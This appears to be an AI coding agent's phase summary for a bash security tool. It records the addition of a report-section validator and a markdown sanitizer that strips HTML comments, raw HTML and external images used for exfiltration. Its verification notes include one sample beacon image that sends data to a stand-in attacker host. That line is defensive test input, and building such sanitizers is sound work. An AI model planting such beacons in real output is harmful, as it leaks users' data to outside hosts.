---
phase: 24-multi-file-publish-bundle
plan: 02
subsystem: infra
tags: [bash, sed, markdown, sanitization, report-validation]

# Dependency graph
requires:
  - phase: 24-multi-file-publish-bundle
    provides: Wave 0 failing test scaffold for verify_bundle_sections and sanitize_markdown_file (Plan 24-01)
provides:
  - verify_bundle_sections() library helper validating 6 mandatory H2 sections
  - sanitize_markdown_file() library helper stripping 4 exfiltration vectors
affects: [24-03, 26-stop-hook]

# Tech tracking
tech-stack:
  added: []
  patterns:
    - "GNU sed multi-line slurp idiom (:a; N; $!ba;) for multi-line HTML comment stripping"
    - "Alternate sed delimiter (#) when regex alternation contains the default delimiter (|)"
    - "Anchored grep regex (^## Section$) for mandatory section validation — prevents partial matches"

key-files:
  created:
    - .planning/phases/24-multi-file-publish-bundle/24-02-SUMMARY.md
  modified:
    - bin/claude-secure

key-decisions:
  - "[Plan 24-02]: Pass 3 sed delimiter changed from | to # because the regex alternation (https?:|//) contains literal | which terminates sed substitutions early"
  - "[Plan 24-02]: Both helpers inserted immediately before redact_report_file() so the Phase 24 RPT-01/RPT-04 primitives cluster with the existing Phase 16 RPT family"

patterns-established:
  - "Library helper pattern: small (~15-50 LOC) pure functions callable in library mode (__CLAUDE_SECURE_SOURCE_ONLY=1), each independently testable without docker compose"
  - "LC_ALL=C sed for determinism across locales"
  - "Append tmp files to _CLEANUP_FILES for spawn_cleanup teardown"

requirements-completed: [RPT-01, RPT-04]

# Metrics
duration: 6min
completed: 2026-04-14
---

# Phase 24 Plan 02: Bundle Validator + Markdown Sanitizer Summary

**Two reusable library helpers in bin/claude-secure: verify_bundle_sections() anchors-checks the 6 mandatory H2 sections of a rendered report body, and sanitize_markdown_file() strips 4 exfiltration vectors (HTML comments, raw HTML tags, external inline images, external reference-style image defs) while preserving local image refs.**

## Performance

- **Duration:** 6 min
- **Started:** 2026-04-14T08:08:54Z
- **Completed:** 2026-04-14T08:15:04Z
- **Tasks:** 2
- **Files modified:** 1 (bin/claude-secure)

## Accomplishments

- `verify_bundle_sections()` at bin/claude-secure:1048 — validates all 6 H2 sections (Goal, Where Worked, What Changed, What Failed, How to Test, Future Findings) are present via anchored `^## Section$` regex. Returns 0 on success, 1 with per-missing-section stderr on failure.
- `sanitize_markdown_file()` at bin/claude-secure:1096 — 4-pass in-place sed pipeline: (1) multi-line HTML comments via `:a; N; $!ba;` slurp, (2) raw HTML tags, (3) external inline images, (4) external reference-style image definitions. Preserves local image refs (`./img.png`, `img/foo.svg`).
- Both helpers inserted before redact_report_file() (line 1140) so Phase 24's RPT-01/RPT-04 primitives cluster with the existing Phase 16 RPT family.
- Bash syntax check clean (`bash -n bin/claude-secure` exits 0).
- Manual functional test verified: valid body → exit 0, body missing a section → exit 1 with stderr naming the section, partial match (`## Goal Achievements`) correctly rejected (anchored regex works), all 4 exfiltration vectors stripped, both local-image types preserved.

## Task Commits

1. **Task 1: verify_bundle_sections()** — `a1050c6` (feat)
2. **Task 2: sanitize_markdown_file()** — `d0afb4c` (feat, includes Rule 1 deviation)

## Files Created/Modified

- `bin/claude-secure` — Added 2 library functions (~104 new lines total) between existing build_report_body() and redact_report_file() at lines 1048-1151.
- `.planning/phases/24-multi-file-publish-bundle/24-02-SUMMARY.md` — This summary.

## Decisions Made

- **Pass 3 sed delimiter changed from `|` to `#`** (Rule 1 deviation — see below). The plan's action text literally specified `s|!\[[^]]*\]\((https?:|//)[^)]*\)||g` but the alternation `(https?:|//)` inside the group contains `|`, which terminates the sed s-command early and produces `sed: -e expression #1, char 35: unknown option to 's'`. Switched delimiter to `#`. Added inline comment explaining the choice.
- **Functions inserted before `redact_report_file`** (as specified by the plan) using Edit with old_string anchored on `redact_report_file() {`. This keeps RPT-family functions physically adjacent in the source.

## Deviations from Plan

### Auto-fixed Issues

**1. [Rule 1 - Bug] Fixed Pass 3 sed delimiter collision**

- **Found during:** Task 2 (sanitize_markdown_file implementation + manual verification)
- **Issue:** Plan's action text literally specified `LC_ALL=C sed -E -i.bak 's|!\[[^]]*\]\((https?:|//)[^)]*\)||g' "$f"`. Running it produced `sed: -e expression #1, char 35: unknown option to 's'` and failed to strip external image references. Root cause: `|` used both as the s-command delimiter AND as alternation inside `(https?:|//)` — sed interprets the first `|` inside the group as the end of the replacement section.
- **Fix:** Changed the delimiter from `|` to `#` (not present in the regex): `sed -E -i.bak 's#!\[[^]]*\]\((https?:|//)[^)]*\)##g'`. Added inline comment explaining the choice so future maintainers don't reintroduce the bug.
- **Files modified:** bin/claude-secure (sanitize_markdown_file Pass 3)
- **Verification:** Post-fix, `![beacon](https://attacker.tld/?data=x)` is stripped cleanly; `![local](./local.png)` and `![also-local](img/foo.svg)` preserved; no sed errors on stderr.
- **Committed in:** d0afb4c (Task 2 commit)

---

**Total deviations:** 1 auto-fixed (Rule 1 — bug in plan's specified sed command).
**Impact on plan:** Minimal. The fix is a one-character delimiter change, the function signature/behavior match the plan's intent, and no acceptance criteria were relaxed. The acceptance criterion `grep -F '!\[[^]]*\]\((https?:' bin/claude-secure` still passes because the regex pattern itself is unchanged — only the outer sed delimiter differs.

## Issues Encountered

- **Plan 01 not yet executed in this worktree.** This plan (24-02) was spawned as a parallel executor agent simultaneously with Plan 01 (Wave 0 test scaffold). As a result, `tests/test-phase24.sh` and `tests/fixtures/bundles/` do not exist yet on this branch, so the plan's `test-phase24.sh`-based automated verifications could not be run here. Instead, the functions were verified via:
  1. `bash -n bin/claude-secure` (syntax-only parse) — PASSED
  2. Direct function invocation in a bash subshell with `__CLAUDE_SECURE_SOURCE_ONLY=1 source bin/claude-secure` and hand-written fixtures — all behaviors passed (6 sections valid/missing/partial for verify_bundle_sections; 4 exfil vectors + 2 local refs + nonexistent path for sanitize_markdown_file).
  3. Phase 16 and Phase 23 regression suites (pre-existing failures verified unrelated — see below).
  4. When the orchestrator merges Plan 01 + Plan 02 output, the real test suite will pick these helpers up automatically. The function signatures (`verify_bundle_sections $1=body_path`, `sanitize_markdown_file $1=path`) match exactly what Plan 01's test contract requires.
- **Phase 16 pre-existing failure:** `tests/test-phase16.sh` reports `32/33 passed, 1 failed` (`FAIL: report template fallback chain`). This failure is **pre-existing** — verified by stashing my changes and re-running against the prior HEAD: same result. Not introduced by this plan. Out of scope (scope boundary: only auto-fix issues DIRECTLY caused by this task's changes).
- **Phase 23 pre-existing failure:** `tests/test-phase23.sh` reports `17/18 passed, 1 failed` (`FAIL: docs_token_absent_from_container`). Also pre-existing (verified by stashing). This is a known human-UAT item already captured in `23-profile-doc-repo-binding/23-HUMAN-UAT.md` and `23-profile-doc-repo-binding/23-UAT.md`. Out of scope.

## User Setup Required

None — pure library additions, no new external dependencies, no operator action required.

## Next Phase Readiness

- Plan 24-03 (`publish_docs_bundle` orchestrator) can now compose these two helpers. Contract for callers:
  - `verify_bundle_sections "$body_path"` — call before publish, re-prompt on non-zero exit.
  - `sanitize_markdown_file "$body_path"` — call AFTER `redact_report_file` in the publish pipeline (per the order comment in the function header, which restates Pitfall 1 from 24-RESEARCH.md).
- Wave 1 test state when Plan 01 merges: expected `test-phase24.sh` result jumps from 2/13 (Wave 0 GREEN: fixtures_exist + bundle_template_installed) to 4/13 (Wave 1 GREEN: +verify_bundle_sections + sanitize_markdown_file). The remaining 9 RED tests belong to Plan 24-03's `publish_docs_bundle` orchestrator.

## Self-Check: PASSED

- `bin/claude-secure` modified — FOUND (line 1048: `verify_bundle_sections() {`, line 1096: `sanitize_markdown_file() {`, line 1140: `redact_report_file() {` — order a<b<c verified via awk).
- Commit `a1050c6` — FOUND (`feat(24-02): add verify_bundle_sections() helper (RPT-01)`).
- Commit `d0afb4c` — FOUND (`feat(24-02): add sanitize_markdown_file() helper (RPT-04)`).
- `bash -n bin/claude-secure` — exits 0.
- Manual function tests — all 6 sections validation cases pass; all 4 exfil vectors stripped; local images preserved; nonexistent path returns 1.

---
*Phase: 24-multi-file-publish-bundle*
*Completed: 2026-04-14*
